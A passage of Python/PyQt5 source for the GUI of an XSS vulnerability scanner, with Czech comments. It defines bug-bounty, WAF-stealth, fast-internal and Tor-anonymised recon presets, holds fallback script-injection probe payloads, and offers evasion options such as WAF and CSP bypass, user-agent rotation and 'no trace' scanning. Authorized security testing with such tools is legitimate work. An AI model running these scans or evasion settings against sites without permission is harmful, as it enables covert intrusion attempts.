        self.ck_tor_iso.setChecked(False)
        self.sp_tor_rot.setValue(50)
        self.ck_ssl.setChecked(True)
        self.ck_foll.setChecked(True)
        # Detekce & vektory
        self.ck_post.setChecked(True)
        self.ck_json.setChecked(True)
        self.ck_hdr.setChecked(True)
        self.ck_dom.setChecked(True)
        self.ck_ctx.setChecked(True)
        self.ck_stored.setChecked(False)
        self.ck_blind.setChecked(False)
        self.ck_postmsg.setChecked(True)
        self.ck_websock.setChecked(True)
        self.ck_fuzz.setChecked(False)
        # ── v5/v6/v7 ── bug bounty: dom_v6+static_js zapnout (vysoká hodnota,
        # rozumný cost), headless verifier ne (cost ~600ms/finding, na bounty
        # většinou nemá smysl).
        self.ck_dom_v6.setChecked(True)
        self.ck_static_js.setChecked(True)
        self.ck_sourcemap.setChecked(True)
        self.ck_headless.setChecked(False)
        self.ck_trusted_types.setChecked(True)
        self.ck_stored_roundtrip.setChecked(True)
        self.ck_proto_pollution.setChecked(True)
        self.ck_dom_clobbering.setChecked(True)
        self.ck_ssr_hydration.setChecked(True)
        self.ck_csp_bypass.setChecked(True)
        self.ck_adaptive_waf.setChecked(True)
        self.ck_open_redirect.setChecked(True)
        self.ck_param_wordlist.setChecked(True)   # v10.14: bounty = deep param discovery ON
        # v10.16: high-value bug-bounty vektory — path/cookie reflexe,
        # JSONP injection, dangling markup (CSP-resistant), SVG/XML XSS.
        self.ck_path.setChecked(True)
        self.ck_cookie.setChecked(True)
        self.ck_jsonp.setChecked(True)
        self.ck_dangling.setChecked(True)
        self.ck_svg.setChecked(True)
        self.ck_graphql.setChecked(True)
        # v10.16: resume + HTML report — pro bounty se hodí oboje
        self.ck_resume.setChecked(True)
        self.ck_html_report.setChecked(True)
        self.ck_txt_report.setChecked(False)   # v10.16: TXT volitelný, default off
        self.ck_json_report.setChecked(True)  # v10.16: JSON pro tooling
        # v10.14: Destruktivní testy — NIKDY automaticky zapnuté presetem.
        # Vyžadují vždy manuální zaškrtnutí + autorizaci přes dialog.
        self.ck_destructive.setChecked(False)
        self.ck_ssrf.setChecked(False)  # v10.15: SSRF nikdy auto-on (autorizace)
        self.ck_mark.setChecked(True)
        self.ck_can.setChecked(False)
        self.ck_verb.setChecked(False)
        # Fuzzer parametry (pro případ že user zapne fuzzer ručně)
        self.ck_fz_probe.setChecked(True)
        # Výkon
        self.sp_wrk.setValue(15)
        self.sp_sl.setValue(0.05)
        self.sp_to.setValue(8)
        self.sp_lu.setValue(0)
        self.sp_dep.setValue(2)
        self.sp_mp.setValue(200)
        self._apply_extended_toggles(aggressive=True)
        _n = self._count_toggles()
        self.sb.showMessage(
            f"Preset applied: Bug Bounty / Authorized Pentest  —  {_n}/{_n} toggles set",
            5000
        )
        self.tabs.setCurrentIndex(5)  # Settings tab

    def _apply_preset_waf(self):
        """Cloudflare/WAF — maximum stealth, minimum requests."""
        # Anti-detection
        self.ck_rota.setChecked(True)
        self.sp_ua_rot.setValue(3)
        self.ck_tor.setChecked(False)
        self.ck_tor_iso.setChecked(False)
        self.sp_tor_rot.setValue(50)
        self.ck_ssl.setChecked(True)
        self.ck_foll.setChecked(False)
        # Detekce & vektory — VYPNOUT všechno co generuje moc requestů
        self.ck_post.setChecked(False)
        self.ck_json.setChecked(False)
        self.ck_hdr.setChecked(False)
        self.ck_dom.setChecked(False)
        self.ck_ctx.setChecked(True)  # snižuje počet requestů
        self.ck_stored.setChecked(False)
        self.ck_blind.setChecked(False)
        self.ck_postmsg.setChecked(False)
        self.ck_websock.setChecked(False)
        self.ck_fuzz.setChecked(False)
        # ── v5/v6/v7 ── WAF preset: pouštíme client-side analýzu naplno,
        # protože server-side requesty jsou minimalizované, ale chceme maximum
        # informací z toho mála findings co projdou. Static JS je čistě offline
        # (neproletí WAFem), DOM v6 + headless verifier dokumentují každý
        # nález pro report.
        self.ck_dom_v6.setChecked(True)
        self.ck_static_js.setChecked(True)
        self.ck_sourcemap.setChecked(True)
        self.ck_headless.setChecked(True)
        self.ck_trusted_types.setChecked(True)
        self.ck_stored_roundtrip.setChecked(False)
        self.ck_proto_pollution.setChecked(True)
        self.ck_dom_clobbering.setChecked(True)
        self.ck_ssr_hydration.setChecked(True)
        self.ck_csp_bypass.setChecked(True)
        self.ck_adaptive_waf.setChecked(True)
        self.ck_open_redirect.setChecked(True)
        self.ck_param_wordlist.setChecked(False)  # waf preset: param discovery off (focus on WAF bypass)
        self.ck_destructive.setChecked(False)  # v10.14: nikdy auto-on
        self.ck_ssrf.setChecked(False)  # v10.15: SSRF nikdy auto-on
        # v10.16: WAF preset — pasivní/stealth vektory ON (jeden request,
        # vysoká hodnota), aktivní fuzzing zůstává off.
        self.ck_path.setChecked(True)
        self.ck_cookie.setChecked(True)
        self.ck_jsonp.setChecked(True)
        self.ck_dangling.setChecked(True)
        self.ck_svg.setChecked(True)
        self.ck_graphql.setChecked(True)
        self.ck_resume.setChecked(True)
        self.ck_html_report.setChecked(True)
        self.ck_txt_report.setChecked(False)   # v10.16: TXT volitelný, default off
        self.ck_json_report.setChecked(True)  # v10.16: JSON pro tooling
        self.ck_mark.setChecked(True)
        self.ck_can.setChecked(False)  # v10.16: WAF preset potřebuje plnou payload sadu pro hledání bypassu — fast scan OFF
        self.ck_verb.setChecked(False)
        self.ck_fz_probe.setChecked(True)
        # Výkon — pomalu
        self.sp_wrk.setValue(4)
        self.sp_sl.setValue(0.4)
        self.sp_to.setValue(15)
        self.sp_lu.setValue(80)
        self.sp_dep.setValue(1)
        self.sp_mp.setValue(50)
        self._apply_extended_toggles(aggressive=False)  # stealth: no extra vectors
        _n = self._count_toggles()

        self.sb.showMessage(
            f"Preset applied: Cloudflare/Akamai/Imperva WAF target  —  maximum stealth, {_n}/{_n} toggles",
            5000
        )
        self.tabs.setCurrentIndex(5)  # Settings tab

    def _apply_preset_fast(self):
        """Fast internal — full speed, full coverage."""
        # Anti-detection — nepotřebné
        self.ck_rota.setChecked(False)
        self.sp_ua_rot.setValue(5)
        self.ck_tor.setChecked(False)
        self.ck_tor_iso.setChecked(False)
        self.sp_tor_rot.setValue(50)
        self.ck_ssl.setChecked(False)  # self-signed certy v dev
        self.ck_foll.setChecked(True)
        # Detekce & vektory — všechno
        self.ck_post.setChecked(True)
        self.ck_json.setChecked(True)
        self.ck_hdr.setChecked(True)
        self.ck_dom.setChecked(True)
        self.ck_ctx.setChecked(True)
        self.ck_stored.setChecked(True)
        self.ck_blind.setChecked(False)  # vyžaduje OOB URL
        self.ck_postmsg.setChecked(True)
        self.ck_websock.setChecked(True)
        self.ck_fuzz.setChecked(True)
        # ── v5/v6/v7 ── fast preset: static_js JEN (rychlé ms/file).
        # DOM v6 a headless jsou drahé (Chromium per page) — odhrazujeme.
        self.ck_dom_v6.setChecked(False)
        self.ck_static_js.setChecked(True)
        self.ck_sourcemap.setChecked(True)
        self.ck_headless.setChecked(False)
        # v10.16: fast preset ZAPÍNÁ fast scan — místo plného payload listu
        # pošle ~18 high-signal payloadů (polyglot + per-context reprezentanti).
        # To je hlavní pákou rychlosti: drasticky méně requestů na parametr.
        self.ck_can.setChecked(True)
        self.ck_trusted_types.setChecked(True)
        self.ck_stored_roundtrip.setChecked(False)
        self.ck_proto_pollution.setChecked(True)
        self.ck_dom_clobbering.setChecked(True)
        self.ck_ssr_hydration.setChecked(True)
        self.ck_csp_bypass.setChecked(True)
        self.ck_adaptive_waf.setChecked(True)
        self.ck_open_redirect.setChecked(True)
        self.ck_param_wordlist.setChecked(False)  # fast preset: param discovery off (keeps request count low)
        self.ck_destructive.setChecked(False)  # v10.14: nikdy auto-on
        self.ck_ssrf.setChecked(False)  # v10.15: SSRF nikdy auto-on
        # v10.16: fast preset = nízký request count. Extra aktivní skeny
        # (path/cookie/jsonp/dangling/svg) přidávají requesty → OFF.
        # resume + HTML report jsou levné → ON.
        self.ck_path.setChecked(False)
        self.ck_cookie.setChecked(False)
        self.ck_jsonp.setChecked(False)
        self.ck_dangling.setChecked(False)
        self.ck_svg.setChecked(False)
        self.ck_graphql.setChecked(False)
        self.ck_resume.setChecked(True)
        self.ck_html_report.setChecked(True)
        self.ck_txt_report.setChecked(False)   # v10.16: TXT volitelný, default off
        self.ck_json_report.setChecked(True)  # v10.16: JSON pro tooling
        self.ck_verb.setChecked(True)  # debug on internal
        self.ck_fz_probe.setChecked(True)
        # Výkon — max
        self.sp_wrk.setValue(40)
        self.sp_sl.setValue(0.01)
        self.sp_to.setValue(5)
        self.sp_lu.setValue(0)
        self.sp_dep.setValue(3)
        self.sp_mp.setValue(500)
        self._apply_extended_toggles(aggressive=True)  # max coverage: all vectors
        _n = self._count_toggles()

        self.sb.showMessage(
            f"Preset applied: Fast internal scan  —  maximum coverage, {_n}/{_n} toggles",
            5000
        )
        self.tabs.setCurrentIndex(5)  # Settings tab

    def _apply_preset_recon(self):
        """Research/OSINT — anonymous low-and-slow, no trace."""
        # Anti-detection — maximum
        self.ck_rota.setChecked(True)
        self.sp_ua_rot.setValue(5)
        self.ck_tor.setChecked(True)
        self.ck_tor_iso.setChecked(False)
        self.sp_tor_rot.setValue(40)
        self.ck_ssl.setChecked(True)
        self.ck_foll.setChecked(False)  # tichý scan
        # Detekce & vektory — pasivní, žádná stopa
        self.ck_post.setChecked(False)
        self.ck_json.setChecked(False)
        self.ck_hdr.setChecked(False)
        self.ck_dom.setChecked(False)
        self.ck_ctx.setChecked(True)  # pasivní detekce
        self.ck_stored.setChecked(False)  # zanechá stopu v DB
        self.ck_blind.setChecked(False)
        self.ck_postmsg.setChecked(False)
        self.ck_websock.setChecked(False)
        self.ck_fuzz.setChecked(False)
        # ── v5/v6/v7 ── recon preset: pasivní jen. DOM v6 a headless
        # vystřelují plný Chromium engine s realistickým fingerprint —
        # zanechá stopy v telemetry. Static JS je čistě offline analýza
        # už staženého kódu, ideální pro recon.
        self.ck_dom_v6.setChecked(False)
        self.ck_static_js.setChecked(True)
        self.ck_sourcemap.setChecked(True)
        self.ck_headless.setChecked(False)
        self.ck_trusted_types.setChecked(True)
        self.ck_stored_roundtrip.setChecked(False)
        self.ck_proto_pollution.setChecked(True)
        self.ck_dom_clobbering.setChecked(True)
        self.ck_ssr_hydration.setChecked(True)
        self.ck_csp_bypass.setChecked(True)
        self.ck_adaptive_waf.setChecked(True)
        self.ck_open_redirect.setChecked(True)
        self.ck_param_wordlist.setChecked(False)
        self.ck_destructive.setChecked(False)  # v10.14: nikdy auto-on
        self.ck_ssrf.setChecked(False)  # v10.15: SSRF nikdy auto-on
        # v10.16: recon = low-and-slow, minimální stopa. Aktivní injection
        # skeny (path/cookie/jsonp/dangling/svg) zanechávají stopu → OFF.
        # resume + HTML report neovlivní telemetrii → ON.
        self.ck_path.setChecked(False)
        self.ck_cookie.setChecked(False)
        self.ck_jsonp.setChecked(False)
        self.ck_dangling.setChecked(False)
        self.ck_svg.setChecked(False)
        self.ck_graphql.setChecked(False)
        self.ck_resume.setChecked(True)
        self.ck_html_report.setChecked(True)
        self.ck_txt_report.setChecked(False)   # v10.16: TXT volitelný, default off
        self.ck_json_report.setChecked(True)  # v10.16: JSON pro tooling
        self.ck_mark.setChecked(False)  # marker parametr zanechá stopu
        self.ck_can.setChecked(False)  # v10.16: recon = důkladný, plná payload sada — fast scan OFF
        self.ck_verb.setChecked(False)
        self.ck_fz_probe.setChecked(True)
        # Výkon — low and slow
        self.sp_wrk.setValue(4)
        self.sp_sl.setValue(0.3)
        self.sp_to.setValue(20)
        self.sp_lu.setValue(40)
        self.sp_dep.setValue(1)
        self.sp_mp.setValue(50)
        self._apply_extended_toggles(aggressive=False)  # low-and-slow: no extra vectors
        _n = self._count_toggles()

        self.sb.showMessage(
            f"Preset applied: Research / Recon (OSINT)  —  anonymous low-and-slow, {_n}/{_n} toggles",
            5000
        )
        self.tabs.setCurrentIndex(5)  # Settings tab

    # ── Scan control ──────────────────────────────────────────────────

    def _start(self):
        target = self.inp_target.text().strip()
        if not target: self.sb.showMessage("ENTER TARGET URL"); return
        # GUARD: never launch a second scan while one is still running. run_scan
        # honours cancellation only at phase boundaries, so a just-stopped scan
        # can still be finishing a phase; starting now would run TWO run_scan()
        # instances concurrently (interleaved output, shared module state).
        if getattr(self, "worker", None) is not None and self.worker.isRunning():
            self.sb.showMessage("SCAN ALREADY RUNNING — STOP IT FIRST")
            return
        self._stopping = False
        self._force_ready = False
        self._collected_hits = []   # fresh scan → fresh findings for Save
        self._reset(); self.hit_count = 0; self.start_time = time.time()
        # Attack graph — nastav root target a přejdi do mapping módu
        if hasattr(self, '_attack_graph'):
            self._attack_graph.set_target(target)
            # Pokud je Tor aktivní, oznam grafu (exit IP se doplní po verifikaci v ScanWorkeru)
            if self.ck_tor.isChecked():
                self._attack_graph.set_tor_status(True, exit_ip=None)
                self.lbl_tor_status.setText("Tor: verifying exit IP...")
                self.lbl_tor_status.setStyleSheet("color: #d29922; font-size: 11px;")
            else:
                self._attack_graph.set_tor_status(False)
                self.lbl_tor_status.setText("Tor: disabled")
                self.lbl_tor_status.setStyleSheet("color: #808080; font-size: 11px;")
        # Reset per-phase progress tracker (ETA)
        if hasattr(self, '_phase_progress'):
            del self._phase_progress
        self.btn_start.setEnabled(False); self.btn_stop.setEnabled(True)
        self._c_status._val.setText("RUNNING"); self._c_status._val.setStyleSheet("color:#ff2d55; font-size:20px; font-weight:bold;")
        self._timer.start(1000); self.tabs.setCurrentIndex(0)

        try:
            here = os.path.dirname(os.path.abspath(__file__))
            import importlib.util
            spec = importlib.util.spec_from_file_location("xss_grenade", os.path.join(here,"xss_grenade.py"))
            mod  = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
            payloads = mod.load_payloads(mod.PAYLOAD_FILE); user_agents = mod.DEFAULT_USER_AGENTS
        except Exception:
            payloads = ["<script>alert('XSS')</script>","<svg onload=alert('XSS')>"]; user_agents = ["Mozilla/5.0 (xss/txc0re)"]

        cfg = {
            "target":target, "payloads":payloads, "workers":self.sp_wrk.value(),
            "timeout":self.sp_to.value(), "sleep":self.sp_sl.value(),
            "verify_ssl":self.ck_ssl.isChecked(), "limit_urls":self.sp_lu.value() or 0,
            "canary":self.ck_can.isChecked(), "marker":self.ck_mark.isChecked(),
            "verbose":self.ck_verb.isChecked(), "report_path":self.inp_rep.text() or "xss_report.txt",
            "json_report":self.inp_jrp.text() or "xss_report.json",
            "rotate_ua":self.ck_rota.isChecked(), "user_agents":user_agents,
            "proxy":self.inp_prx.text().strip(), "follow_redirects":self.ck_foll.isChecked(),
            "auth_cookies":self.inp_auth_cookies.text().strip(),  # v10.15: cookie injection
            "crawl_depth":self.sp_dep.value(), "crawl_max_pages":self.sp_mp.value(),
            "fuzz":self.ck_fuzz.isChecked(), "post":self.ck_post.isChecked(),
            "json_scan":self.ck_json.isChecked(), "headers":self.ck_hdr.isChecked(), "dom":self.ck_dom.isChecked(),
            "path_scan":self.ck_path.isChecked(), "cookie_scan":self.ck_cookie.isChecked(),
            "resume":self.ck_resume.isChecked(),
            "html_report":self.ck_html_report.isChecked(),
            "txt_report":self.ck_txt_report.isChecked(),
            "json_report_enabled":self.ck_json_report.isChecked(),
            "jsonp":self.ck_jsonp.isChecked(),
            "dangling":self.ck_dangling.isChecked(),
            "svg":self.ck_svg.isChecked(),
            "graphql":self.ck_graphql.isChecked(),
            "markdown":self.ck_markdown.isChecked(),
            "css":self.ck_css.isChecked(),
            "htmx_alpine":self.ck_htmx_alpine.isChecked(),
            "dompurify_config":self.ck_dompurify_cfg.isChecked(),
            "cache_poisoning":self.ck_cache_poison.isChecked(),
            # ── v10.58: CLI parity ──
            "sarif":self.ck_sarif.isChecked(),
            "poc":self.ck_poc.isChecked(),
            "evidence":self.ck_evidence.isChecked(),
            "cors_scan_enabled":self.ck_cors.isChecked(),
            "crlf_scan_enabled":self.ck_crlf.isChecked(),
            "xssi_scan_enabled":self.ck_xssi.isChecked(),
            "legacy_tls":self.ck_legacy_tls.isChecked(),
            "warmup_origin":self.ck_warmup.isChecked(),
            "scan_intensity":(None if self.cmb_intensity.currentText() == "(default)"
                              else self.cmb_intensity.currentText()),
            "cffi_impersonate":(None if self.cmb_cffi.currentText() == "(off)"
                                else self.cmb_cffi.currentText()),
            "dom_wait":self.sp_dom_wait.value(),
            "dom_budget_secs":self.sp_dom_budget.value(),
            "evidence_origin":self.cmb_evidence_origin.currentText(),
            "evidence_retention_days":(self.sp_evidence_ret.value() or None),
            "stored_verify_urls":([u for u in
                self.inp_stored_verify.text().replace(",", " ").split() if u] or None),
            "stored_wait_secs":self.sp_stored_wait.value(),
            "ua_fresh":self.ck_ua_fresh.isChecked(),
            "target_country":(self.inp_target_country.text().strip().upper() or None),
            "ua_file":(self.inp_ua_file.text().strip() or None),
            "fuzz_topn":self.sp_fz_topn.value(), "fuzz_batch":self.sp_fz_batch.value(),
            "fuzz_iters":self.sp_fz_iters.value(), "fuzz_budget_secs":self.sp_fz_budget.value(),
            "fuzz_ctx_probe":self.ck_fz_probe.isChecked(),
            "context_scan":self.ck_ctx.isChecked(),
            "stored_scan":self.ck_stored.isChecked(),
            "blind_xss":self.ck_blind.isChecked(),
            "blind_oob_url":self.inp_blind_oob.text().strip() or None,
            "postmessage_scan":self.ck_postmsg.isChecked(),
            "websocket_scan":self.ck_websock.isChecked(),
            # ── v5/v6/v7: nové detection fáze ──
            "headless_verify":self.ck_headless.isChecked(),
            "dom_v6_taint":self.ck_dom_v6.isChecked(),
            "static_js":self.ck_static_js.isChecked(),
            "sourcemap":self.ck_sourcemap.isChecked(),
            "trusted_types":self.ck_trusted_types.isChecked(),
            "stored_roundtrip":self.ck_stored_roundtrip.isChecked(),
            "proto_pollution":self.ck_proto_pollution.isChecked(),
            "dom_clobbering":self.ck_dom_clobbering.isChecked(),
            "ssr_hydration":self.ck_ssr_hydration.isChecked(),
            "csp_bypass":self.ck_csp_bypass.isChecked(),
            "adaptive_waf":self.ck_adaptive_waf.isChecked(),
            "open_redirect":self.ck_open_redirect.isChecked(),
            "param_wordlist":self.ck_param_wordlist.isChecked(),  # v10.14
            # v10.14: Destruktivní testy — vyžaduje explicitní autorizaci
            # přes warning dialog v _handle_destructive_checkbox_click.
            # Pokud True, run_scan spustí Cache Poisoning + Host Header
            # password reset + Stored XSS via headers fáze.
            # v10.15: SSRF — opt-in s autorizačním dialogem (jako destructive)
            "ssrf_scan_enabled":self.ck_ssrf.isChecked(),
            "destructive_enabled":self.ck_destructive.isChecked(),
            "destructive_test_email":(
                self.inp_destructive_email.text().strip() or None
            ),
            # Tor + UA rotace
            "tor_enabled":self.ck_tor.isChecked(),
            "tor_control_port":self.sp_tor_ctrl.value(),
            "tor_socks_port":self.sp_tor_socks.value(),
            "tor_password":self.inp_tor_pwd.text() or None,
            "tor_rotate_every":self.sp_tor_rot.value() if self.ck_tor.isChecked() else 0,
            "tor_isolate_workers":self.ck_tor_iso.isChecked(),
            "ua_rotate_every":self.sp_ua_rot.value(),
        }
        self.worker = ScanWorker(cfg)
        self._dbg_log(f"[START] Worker created, hit_q={self.worker.hit_q}, waf_q={self.worker.waf_q}")
        self.worker.sig_log.connect(self._log);            self.worker.sig_csp.connect(self._csp)
        self.worker.sig_crawl_progress.connect(self._cpro);self.worker.sig_crawl_done.connect(self._cdone)
        self.worker.sig_progress.connect(self._prog);      self.worker.sig_phase.connect(self._phase)
        self.worker.sig_finished.connect(self._done);      self.worker.sig_error.connect(self._err)
        # Defensive backstop: QThread.finished fires when run() truly returns,
        # even if sig_finished/sig_error somehow didn't. Guarantees the UI
        # leaves the STOPPING/RUNNING state and re-enables Start exactly once
        # the worker thread has actually ended.
        self.worker.finished.connect(self._on_worker_finished)
        self.worker.start()

    def _on_worker_finished(self):
        # Ignore a stale 'finished' from a PREVIOUS worker: the old connection is
        # never disconnected, so if a new scan already started, acting on the old
        # signal would re-enable Start / set FINISH mid-scan. Skip only when the
        # sender is a KNOWN-DIFFERENT worker; a None sender (direct call / no
        # signal context) proceeds normally.
        _sndr = self.sender()
        if _sndr is not None and _sndr is not getattr(self, "worker", None):
            return
        # Thread genuinely ended — clear the stopping flag and make sure the
        # controls are back to a startable state (idempotent with _finish()).
        self._stopping = False
        if not self.btn_start.isEnabled():
            self._finish()
        if self.sb.currentMessage().startswith("STOPPING"):
            self.sb.showMessage("SCAN STOPPED")

    def _stop(self):
        w = getattr(self, "worker", None)
        if w is None or not w.isRunning():
            self._finish(); self.sb.showMessage("SCAN STOPPED")
            self._force_ready = False
            return

        if self._force_ready:
            # Second press → FORCE KILL. A graceful stop can lag: run_scan only
            # checks cancel at phase/loop boundaries and an in-flight browser
            # render or a slow request can't be interrupted mid-flight. This hard-
            # terminates the worker thread. Findings already in the table are
            # safe — use 💾 SAVE to export them.
            self.log_out.append(
                '<span style="color:#ef4444">&#9209; FORCE STOP — worker thread '
                'terminated. Findings are kept; use &#128190; SAVE to export them.</span>')
            # v10.80: stop the async poller BEFORE terminate() so it cannot race
            # the dying thread on the queue's internal lock (→ GUI hard-freeze),
            # then hard-kill, then a FINAL synchronous drain so hits already in
            # hit_q (not yet drained by the 80ms poll) are rescued into
            # _collected_hits before _finish. (terminate() bypasses the engine's
            # browser cleanup, so a headless-verify scan may leave one Chromium
            # behind — the graceful first press avoids that.)
            try:
                self._poll_timer.stop()
            except Exception:
                pass
            try:
                w.terminate(); w.wait(2000)
            except Exception:
                pass
            try:
                self._poll_queues(drain_all=True)   # rescue undrained hits
            except Exception:
                pass
            try:
                self._poll_timer.start(80)          # keep poller live for next scan
            except Exception:
                pass
            self._stopping = False
            self._force_ready = False
            self.btn_stop.setText("[]  STOP")
            self._finish(stopped=True)
            self.sb.showMessage("FORCE STOPPED — thread killed. Findings kept; use SAVE.")
            return

        # First press → graceful STOPPING, but keep the button LIVE as FORCE STOP
        # so a second press hard-kills instead of the user waiting.
        self._stopping = True
        self._force_ready = True
        w.stop()  # sets cancel_event → sessions abort queued requests instantly
        self.btn_stop.setText("⚠  FORCE STOP")
        self.btn_stop.setEnabled(True)      # stays live for the force press
        self.btn_start.setEnabled(False)
        self._timer.stop()
        self._c_status._val.setText("STOPPING")
        self._c_status._val.setStyleSheet(
            "color:#d29922; font-size:20px; font-weight:bold;")
        self._c_eta._val.setText("--:--")
        if hasattr(self, '_attack_graph'):
            self._attack_graph.stop()
        self.sb.showMessage(
            "STOPPING — aborting… press again to FORCE STOP. Findings are kept "
            "(use SAVE anytime).")

    def _save_findings(self):
        """Save findings collected so far to JSON + HTML report + PoC bundle.
        Works ANYTIME — mid-scan, during a slow Stop, or after a force stop — so
        a laggy/killed scan never loses what was already found."""
        hits = list(self._collected_hits)
        if not hits:
            self.sb.showMessage("Nothing to save yet — no findings collected.")
            return
        from PyQt5.QtWidgets import QFileDialog
        import time as _t, json as _json, os as _os
        folder = QFileDialog.getExistingDirectory(self, "Save findings to folder…")
        if not folder:
            return
        base = _os.path.join(folder, "xssgrenade_findings")  # timestamp appended below
        try:
            base += "_" + str(int(self.start_time or 0))
        except Exception:
            pass
        target = (self.inp_target.text().strip() or "unknown")
        report = {"target": target, "findings": hits, "findings_deduped": hits,
                  "findings_count": len(hits)}
        written = []
        try:
            with open(base + ".json", "w", encoding="utf-8") as f:
                _json.dump(report, f, indent=2, ensure_ascii=False)
            written.append("JSON")
        except Exception as e:
            self.sb.showMessage(f"Save failed: {e}")
            return
        here = _os.path.dirname(_os.path.abspath(__file__))
        for modname, fn, ext in (("_html_report", "write_html_report", ".html"),
                                 ("_poc_generator", "write_poc_bundle", ".poc.html")):
            try:
                import importlib.util
                spec = importlib.util.spec_from_file_location(
                    modname, _os.path.join(here, modname + ".py"))
                m = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(m)
                getattr(m, fn)(report, base + ext)
                written.append(ext.strip("."))
            except Exception:
                pass
        self.sb.showMessage(
            f"Saved {len(hits)} finding(s) → {base}.* ({', '.join(written)})")
        self.log_out.append(
            f'<span style="color:#22c55e">&#128190; Saved {len(hits)} findings '
            f'to {base}.* ({", ".join(written)})</span>')

    def _finish(self, stopped=False, errored=False):
        self._force_ready = False
        try:
            self.btn_stop.setText("[]  STOP")
        except Exception:
            pass
        self._timer.stop(); self.btn_start.setEnabled(True); self.btn_stop.setEnabled(False)
        # v10.80: reflect the REAL outcome — green FINISH only on a clean finish,
        # amber STOPPED after a user/force stop, red ERROR on a crash. Previously
        # every path (incl. Stop and _err) showed green "FINISH", masking it.
        if errored:
            _lbl, _col = "ERROR", "#ef4444"
        elif stopped:
            _lbl, _col = "STOPPED", "#d29922"
        else:
            _lbl, _col = "FINISH", "#22c55e"
        self._c_status._val.setText(_lbl)
        self._c_status._val.setStyleSheet(f"color:{_col}; font-size:20px; font-weight:bold;")
        self._c_eta._val.setText("0s")
        # Attack graph — zastavit pulsing (status → done)
        if hasattr(self, '_attack_graph'):
            self._attack_graph.stop()

    def _expand_attack_graph(self):
        """Move the LIVE attack-graph widget into a FRAMELESS full-window view
        (it keeps animating/updating). Frameless = a single, clean close control
        in our own slim header — no redundant native title-bar ✕/? (the old
        framed dialog showed two crosses). Esc also closes. One widget instance
        is reparented, so no state is duplicated and hits still render."""
        if getattr(self, "_ag_dialog", None) is not None:
            return  # already expanded
        ag = getattr(self, "_attack_graph", None)
        if ag is None:
            return
        from PyQt5.QtWidgets import (QDialog, QVBoxLayout as _V, QHBoxLayout as _H,
                                     QPushButton as _B, QLabel as _L, QWidget as _W)
        dlg = QDialog(self)
        dlg.setObjectName("ag_fullscreen")
        # Frameless → only ONE close affordance (our ✕). Kills the duplicate
        # native window ✕/? that appeared with the default frame.
        dlg.setWindowFlags(Qt.Window | Qt.FramelessWindowHint)
        dlg.setWindowTitle("Attack graph")
        dlg.setStyleSheet(f"QDialog#ag_fullscreen {{ background: {theme('bg_deep')}; }}")
        lay = _V(dlg); lay.setContentsMargins(0, 0, 0, 0); lay.setSpacing(0)

        # slim professional header bar
        bar = _W(); bar.setObjectName("ag_bar")
        bar.setStyleSheet(
            f"QWidget#ag_bar {{ background: {theme('bg_header')}; "
            f"border-bottom: 1px solid {theme('border')}; }}")
        bl = _H(bar); bl.setContentsMargins(18, 9, 10, 9); bl.setSpacing(12)
        title = _L("ATTACK GRAPH")
        title.setStyleSheet(
            f"color:{theme('fg_strong')}; font-size:12px; font-weight:bold; "
            "letter-spacing:3px;")
        hint = _L("press Esc to close")
        hint.setStyleSheet(f"color:{theme('fg_muted')}; font-size:11px;")
        bl.addWidget(title); bl.addStretch(1); bl.addWidget(hint)
        btn_close = _B("✕")
        btn_close.setToolTip("Close — back to panel")
        btn_close.setFixedSize(30, 26)
        btn_close.setCursor(Qt.PointingHandCursor)
        btn_close.setStyleSheet(
            f"QPushButton{{background:transparent; color:{theme('fg_muted')}; "
            f"border:none; font-size:15px; border-radius:5px;}}"
            f"QPushButton:hover{{background:{theme('bg_btn_hover')}; "
            f"color:{theme('fg_strong')};}}")
        btn_close.clicked.connect(dlg.close)
        bl.addWidget(btn_close)
        lay.addWidget(bar)

        # pull the LIVE graph out of the left panel and into the dialog
        ag.setParent(None)
        ag.set_expanded(True)          # hide the in-graph expand overlay
        lay.addWidget(ag, 1)
        self._ag_dialog = dlg

        def _restore(*_):
            try:
                ag.setParent(None)
                ag.set_expanded(False)                    # show overlay again
                self._ag_graph_layout.addWidget(ag, 1)    # back where it was
            except Exception:
                pass
            self._ag_dialog = None

        dlg.finished.connect(_restore)   # ✕ / Esc both restore
        dlg.showMaximized()

    def _reset(self):
        self.hit_count = 0
        self.log_out.clear(); self.clog.clear(); self.res_tbl.setRowCount(0); self.csp_tbl.setRowCount(0)
        self.csp_raw.clear(); self.csp_score.setText("—"); self.csp_score.setStyleSheet("font-size:42px; font-weight:bold; color:#808080;")
        self.csp_note.setText("Waiting for scan..."); self.csp_extra.clear(); self.pb.setValue(0)
        # v10.16: reset crawler bar zpět na určitý rozsah + IDLE label
        self.cpb.setRange(0, 100); self.cpb.setValue(0)
        if hasattr(self, "cpb_lbl"):
            self.cpb_lbl.setText("IDLE")
        self._c_hits._val.setText("0")
        self._c_eta._val.setText("--:--")
        self._c_status._val.setText("IDLE")
        self._c_status._val.setStyleSheet("color:#888888; font-size:18px; font-weight:bold;"); self._cp._val.setText("0"); self._cpar._val.setText("0")
        self._ce._val.setText("0"); self._cr._val.setText("0.0")
        for i,t in enumerate(["SCAN","CRAWLER","CSP","RESULTS"]): self.tabs.setTabText(i,t)
        # Attack graph — návrat do idle
        if hasattr(self, '_attack_graph'):
            self._attack_graph.reset()

    # ── Signal handlers ───────────────────────────────────────────────

    def _log(self, msg, level):
        # Parse Tor status zprávy — update attack_graph a lbl_tor_status
        if "Tor active" in msg and "exit IP" in msg:
            import re as _re
            m = _re.search(r"exit IP:\s*([\d\.a-fA-F:]+)", msg)
            if m:
                ip = m.group(1)
                if hasattr(self, '_attack_graph'):
                    self._attack_graph.set_tor_status(True, exit_ip=ip)
                if hasattr(self, 'lbl_tor_status'):
                    self.lbl_tor_status.setText(f"Tor: {ip}")
                    self.lbl_tor_status.setStyleSheet("color: #22c55e; font-size: 11px;")
        elif "Tor init failed" in msg or "Tor SOCKS nefunguje" in msg:
            if hasattr(self, '_attack_graph'):
                self._attack_graph.set_tor_status(False)
            if hasattr(self, 'lbl_tor_status'):
                self.lbl_tor_status.setText("Tor: selhal")
                self.lbl_tor_status.setStyleSheet("color: #ef4444; font-size: 11px;")

        if any(x in msg for x in ("[XSS]","[POST-XSS]","[JSON-XSS]","[HEADER-XSS]","[FUZZ HIT]","[DOM-XSS]")):
            color = "#ff2d55"
        elif "[CRAWL PARAM]" in msg:       color = "#22c55e"
        elif "[WAF]" in msg:               color = "#3b82f6"
        elif "[CSP]" in msg:               color = "#8b5cf6"
        elif "ON" in msg:                  color = "#22c55e"
